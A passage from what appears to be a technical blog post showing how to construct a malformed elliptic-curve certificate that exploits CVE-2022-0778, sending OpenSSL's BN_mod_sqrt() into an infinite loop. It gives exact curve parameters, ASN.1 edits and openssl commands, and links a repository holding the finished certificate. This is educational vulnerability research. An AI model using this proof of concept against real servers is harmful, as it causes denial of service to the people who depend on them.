<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">$ openssl x509 -in cert.der -text -noout -inform DER
...
                Field Type: prime-field
                Prime:
                    00:ff:ff:ff:ff:00:00:00:01:00:00:00:00:00:00:
                    00:00:00:00:00:00:ff:ff:ff:ff:ff:ff:ff:ff:ff:
                    ff:ff:ff
                A:
                    00:ff:ff:ff:ff:00:00:00:01:00:00:00:00:00:00:
                    00:00:00:00:00:00:ff:ff:ff:ff:ff:ff:ff:ff:ff:
                    ff:ff:fc
                B:
                    5a:c6:35:d8:aa:3a:93:e7:b3:eb:bd:55:76:98:86:
                    bc:65:1d:06:b0:cc:53:b0:f6:3b:ce:3c:3e:27:d2:
                    60:4b
                Generator (compressed):
                    03:6b:17:d1:f2:e1:2c:42:47:f8:bc:e6:e5:63:a4:
                    40:f2:77:03:7d:81:2d:eb:33:a0:f4:a1:39:45:d8:
                    98:c2:96
                Order:
                    00:ff:ff:ff:ff:00:00:00:00:ff:ff:ff:ff:ff:ff:
                    ff:ff:bc:e6:fa:ad:a7:17:9e:84:f3:b9:ca:c2:fc:
                    63:25:51
...                    
</code></pre></td></tr></table>
</div>
</div><p>Where Prime, A, B, and Generator are the target parameters that we need to change. So what should we change them to? And then by what method to modify it?</p>
<h3 id="constructing-illegal-certificates">Constructing illegal certificates</h3>
<p>First, we need to figure out what these values mean and what relationships they need to satisfy before we can actually do it. An elliptic curve defined over a finite field satisfies the following equation</p>
<p>$$y^2 \equiv x^3+ax+b\quad (mod\ p)$$</p>
<p>Where a is the curve parameter A, b is the curve parameter B, p is the curve parameter Prime, a, b, p parameters determine an elliptic curve. Decompression point coordinates is based on the x-coordinate to calculate the y-coordinate, from the above formula can see that this requires the operation of finding the square root of.</p>
<p>$$y=\sqrt{x^3+ax+b}\quad (mod\ p)$$</p>
<p>We follow the 697/696 combination used before, i.e. at this point p = 697 and $x^3+ax+b=696$. We just have to choose the right a, b, and x to be the ones for which that latter equation holds.</p>
<p>We make x=8, a=23, b=0, and the equation holds.</p>
<p>The next step is to modify our certificate. Modifying the ASN1 structure with my bare hands is really killing me, so if you know of any handy tools, please do not hesitate to ask. The tool I used was mainly <code>xxd</code> to hex format for editing, and then <code>xxd -r</code> to go back after I finished. (Thanks to wllm-rbnt for the asn1template tool, see later for a detailed description)</p>
<ol>
<li>you need to modify the values of the four target fields Prime, A, B and Generator.
<ol>
<li>where Prime is 697, i.e. 02b9 in hexadecimal.</li>
<li>where A is 23, i.e. 17 in hexadecimal</li>
<li>where B is 0.</li>
<li>where Generator has an x of 8, and because it is in compressed format, it is changed to 020008 (or 030008) in hexadecimal.</li>
</ol>
</li>
<li>because ASN1 is a nested structure, after modifying the inner length, you also need to correct the outer length accordingly, which is a manual task.</li>
<li>in addition, the OpenSSL code will check the padding format of ASN1_INTEGER, so the Prime value cannot be preceded by extra 0 bytes, so we must modify the length of the Prime.</li>
<li>and OpenSSL also checks the relationship between the length of the point string and the length of Prime (for the compressed format, the point string needs to be 1 more than the length of Prime), which is why we set the Genrator to 030008 instead of 0308.</li>
<li>One more thing to note is that <code>xxd -r</code> may add a 0a newline at the end of the file after turning back, and you need to eliminate it. There are many ways to do this, one of which is to use the split command.</li>
</ol>
<p>Let&rsquo;s take a look at the ASN1 structure of the certificate, the parts underlined are the parts we need to modify</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">$ openssl asn1parse -in cert.der -inform DER -i
</code></pre></td></tr></table>
</div>
</div><p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/24/0b01f14f5f60417a9d7ad092f8a33688.png" alt="ASN1"></p>
<p>The target values of Prime, A, B, and Generator have been stated above, and the values before and after modification of the relevant lengths are listed in the following table.</p>
<table>
<thead>
<tr>
<th>from(dec)</th>
<th>from(hex)</th>
<th>to(dec)</th>
<th>to(hex)</th>
</tr>
</thead>
<tbody>
<tr>
<td>549</td>
<td>225</td>
<td>488</td>
<td>1e8</td>
</tr>
<tr>
<td>460</td>
<td>1cc</td>
<td>399</td>
<td>18f</td>
</tr>
<tr>
<td>266</td>
<td>10a</td>
<td>205</td>
<td>cd</td>
</tr>
<tr>
<td>227</td>
<td>e3</td>
<td>166</td>
<td>a6</td>
</tr>
<tr>
<td>215</td>
<td>d7</td>
<td>154</td>
<td>9a</td>
</tr>
<tr>
<td>44</td>
<td>2c</td>
<td>13</td>
<td>0d</td>
</tr>
<tr>
<td>33 Prime</td>
<td>21</td>
<td>2</td>
<td>02</td>
</tr>
<tr>
<td>33 Generator</td>
<td>21</td>
<td>3</td>
<td>03</td>
</tr>
</tbody>
</table>
<p>The specific modification process is as follows, where the steps for editing the text have been omitted.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">$ cp cert.der cert.der.old
$ xxd cert.der cert.der.hex
$ cp cert.der.hex cert.der.hex.old
$ vim cert.der.hex
# edit cert.der.hex
# ...
# complete
$ xxd -r cert.der.hex cert.der.new
</code></pre></td></tr></table>
</div>
</div><p>Update March 21, 2022.</p>
<p>A more convenient method is to use the <a href="https://github.com/wllm-rbnt/asn1template">asn1template</a> tool written by wllm-rbnt.</p>
<p>Pull repository.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ git clone https://github.com/wllm-rbnt/asn1template.git
</code></pre></td></tr></table>
</div>
</div><p>Generate a DER template from the certificate.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ ./asn1template/asn1template.pl cert.der &gt; cert.tpl
</code></pre></td></tr></table>
</div>
</div><p>Then modify those parameters we mentioned above, the difference before and after the modification is as follows.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">diff cert.tpl cert_new.tpl
46c46
&lt; <span class="nv">field32</span> <span class="o">=</span> FORMAT:HEX,OCTETSTRING:036B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296
---
&gt; <span class="nv">field32</span> <span class="o">=</span> FORMAT:HEX,OCTETSTRING:030008
51c51
&lt; <span class="nv">field36</span> <span class="o">=</span> INTEGER:0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
---
&gt; <span class="nv">field36</span> <span class="o">=</span> INTEGER:0x2B9
53,54c53,54
&lt; <span class="nv">field37</span> <span class="o">=</span> FORMAT:HEX,OCTETSTRING:FFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC
&lt; <span class="nv">field38</span> <span class="o">=</span> FORMAT:HEX,OCTETSTRING:5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B
---
&gt; <span class="nv">field37</span> <span class="o">=</span> FORMAT:HEX,OCTETSTRING:0000000000000000000000000000000000000000000000000000000000000017
&gt; <span class="nv">field38</span> <span class="o">=</span> FORMAT:HEX,OCTETSTRING:0000000000000000000000000000000000000000000000000000000000000000
</code></pre></td></tr></table>
</div>
</div><p>Then use <code>ASN1_generate_nconf(3)</code> to convert it back to the DER-encoded ASN1:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ openssl asn1parse -genconf cert_new.tpl -noout -out cert_new.der
</code></pre></td></tr></table>
</div>
</div><p>The output certificate file <code>cert_new.der</code> is the same as the version we edited manually before.</p>
<p>At this point our certificate is constructed and we now take a look at the modified ASN1 structure.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ openssl asn1parse -in cert.der.new -inform DER -i
</code></pre></td></tr></table>
</div>
</div><p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/24/8d0eb3c83f9d4c179f7a63df7fc15bbf.png" alt="ASN1 structure"></p>
<p>The redlined parts have all been modified by us and the ASN1 encoding of the certificate is normal.</p>
<h3 id="testing-with-an-illegal-certificate">Testing with an illegal certificate</h3>
<p>OK, now let&rsquo;s try to parse this constructed illegal certificate, and if nothing else, it will enter an infinite loop.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">openssl x509 -in cert.der.new -inform DER -text -noout
</code></pre></td></tr></table>
</div>
</div><p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/24/2d1a4741cb77409cbaa2423b8ccf9fd2.png" alt="openssl"></p>
<p>You can see that the CPU usage of the openssl process is 100% and the call stack is in the <code>BN_mod_sqrt()</code> function.</p>
<p>If a malicious attacker uses a carefully constructed certificate like this during the SSL handshake with the server, the server will enter a dead loop, resulting in a DoS attack.</p>
<p>The constructed certificate and intermediate process products have been uploaded to the <a href="https://github.com/catbro666/CVE-2022-0778">Github repository</a> and are available for those who need them.</p>

    </div>

    
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/openssl/">openssl</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/post/2022-03/function-calling-conventions-in-c/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">Function calling conventions in C</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="/post/2022-03/how-the-linux-kernel-is-booted/">
            <span class="next-text nav-default">How the Linux kernel is booted</span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
  <a href="https://www.sobyte.net/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2021 - 
    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js"></script>
  <script type="text/javascript">
    window.MathJax = {
      tex: {
        inlineMath: [['$','$'], ['\\(','\\)']],
        tags: 'ams',
        }
    };
  </script>
  <script async src="https://cdn.jsdelivr.net/npm/mathjax@3.0.5/es5/tex-mml-chtml.js" integrity="sha256-HGLuEfFcsUJGhvB8cQ8nr0gai9EucOOaIxFw7qxmd+w=" crossorigin="anonymous"></script>








</body>
</html>
